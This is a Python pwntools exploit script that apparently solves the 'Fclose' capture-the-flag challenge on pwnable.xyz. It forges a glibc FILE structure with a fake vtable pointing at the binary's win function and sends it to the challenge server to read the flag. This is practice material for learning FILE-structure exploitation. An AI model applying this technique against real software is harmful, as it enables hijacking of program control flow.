from pwn import *

# Pwnable.xyz Fclose challenge
# 100 points

context(kernel="amd64", arch="amd64")

def main():
	e = ELF("challenge")
	if 0:
		p = process("./challenge")
		gdb.attach(p)
	elif 0:
		p = process(["strace", "-o", "strace.out", "./challenge"])
	else:
		p = remote("svc.pwnable.xyz", 30018)

	win_addr = e.symbols["input"]+0x58
	fake_vtable_addr = win_addr-0x10

	null_ptr = e.symbols["input"] #next(e.search(b"\x00"*8, writable=False))

	file_struct = FileStructure(null=null_ptr)
	file_struct._IO_buf_base = 0
	# file_struct._IO_buf_end = int((binsh_addr - 100) / 2)
	# file_struct._IO_write_ptr = int((binsh_addr - 100) / 2)
	file_struct._IO_save_end = e.symbols["win"]
	file_struct._IO_write_base = 0
	file_struct.vtable = fake_vtable_addr
	payload = bytes(file_struct)

	print(payload)

	p.sendline(payload)
	print(p.recv(10))
	print(p.recvuntil(b"}"))

main()


# _IO_new_file_close_it